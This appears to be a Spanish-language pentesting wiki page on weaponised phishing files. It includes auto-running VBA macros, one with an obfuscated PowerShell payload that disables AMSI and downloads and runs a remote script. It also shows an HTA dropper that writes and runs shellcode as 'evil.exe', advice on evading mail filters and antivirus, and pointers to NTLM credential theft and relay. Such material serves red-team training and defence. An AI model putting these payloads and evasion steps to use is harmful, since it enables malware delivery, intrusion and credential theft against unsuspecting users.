# Archivos y Documentos de Phishing

{{#include ../../banners/hacktricks-training.md}}

## Documentos de Office

Microsoft Word realiza la validación de datos del archivo antes de abrirlo. La validación de datos se lleva a cabo en forma de identificación de la estructura de datos, de acuerdo con el estándar OfficeOpenXML. Si ocurre algún error durante la identificación de la estructura de datos, el archivo que se está analizando no se abrirá.

Por lo general, los archivos de Word que contienen macros utilizan la extensión `.docm`. Sin embargo, es posible renombrar el archivo cambiando la extensión y aún así mantener sus capacidades de ejecución de macros.\
Por ejemplo, un archivo RTF no admite macros, por diseño, pero un archivo DOCM renombrado a RTF será manejado por Microsoft Word y será capaz de ejecutar macros.\
Los mismos internos y mecanismos se aplican a todo el software de la Suite de Microsoft Office (Excel, PowerPoint, etc.).

Puedes usar el siguiente comando para verificar qué extensiones se van a ejecutar por algunos programas de Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files que hacen referencia a una plantilla remota (Archivo – Opciones – Complementos – Administrar: Plantillas – Ir) que incluye macros pueden “ejecutar” macros también.

### Carga de Imagen Externa

Ir a: _Insertar --> Partes Rápidas --> Campo_\
_**Categorías**: Enlaces y Referencias, **Nombres de campo**: includePicture, y **Nombre de archivo o URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Puerta Trasera de Macros

Es posible usar macros para ejecutar código arbitrario desde el documento.

#### Funciones de Carga Automática

Cuanto más comunes sean, más probable es que el AV las detecte.

- AutoOpen()
- Document_Open()

#### Ejemplos de Código de Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Eliminar manualmente los metadatos

Ve a **Archivo > Información > Inspeccionar documento > Inspeccionar documento**, lo que abrirá el Inspector de documentos. Haz clic en **Inspeccionar** y luego en **Eliminar todo** junto a **Propiedades del documento e información personal**.

#### Extensión de Doc

Cuando termines, selecciona el menú desplegable **Guardar como tipo**, cambia el formato de **`.docx`** a **Word 97-2003 `.doc`**.\
Haz esto porque **no puedes guardar macros dentro de un `.docx`** y hay un **estigma** **alrededor** de la extensión habilitada para macros **`.docm`** (por ejemplo, el ícono de miniatura tiene un enorme `!` y algunos gateways web/correo los bloquean por completo). Por lo tanto, esta **extensión heredada `.doc` es el mejor compromiso**.

#### Generadores de macros maliciosas

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Archivos HTA

Un HTA es un programa de Windows que **combina HTML y lenguajes de scripting (como VBScript y JScript)**. Genera la interfaz de usuario y se ejecuta como una aplicación "totalmente confiable", sin las limitaciones del modelo de seguridad de un navegador.

Un HTA se ejecuta utilizando **`mshta.exe`**, que generalmente está **instalado** junto con **Internet Explorer**, haciendo que **`mshta` dependa de IE**. Así que si ha sido desinstalado, los HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forzar la Autenticación NTLM

Hay varias formas de **forzar la autenticación NTLM "remotamente"**, por ejemplo, podrías agregar **imágenes invisibles** a correos electrónicos o HTML que el usuario accederá (¿incluso HTTP MitM?). O enviar a la víctima la **dirección de archivos** que **activarán** una **autenticación** solo por **abrir la carpeta.**

**Revisa estas ideas y más en las siguientes páginas:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Relevo NTLM

No olvides que no solo puedes robar el hash o la autenticación, sino también **realizar ataques de relevo NTLM**:

- [**Ataques de Relevo NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (relevo NTLM a certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
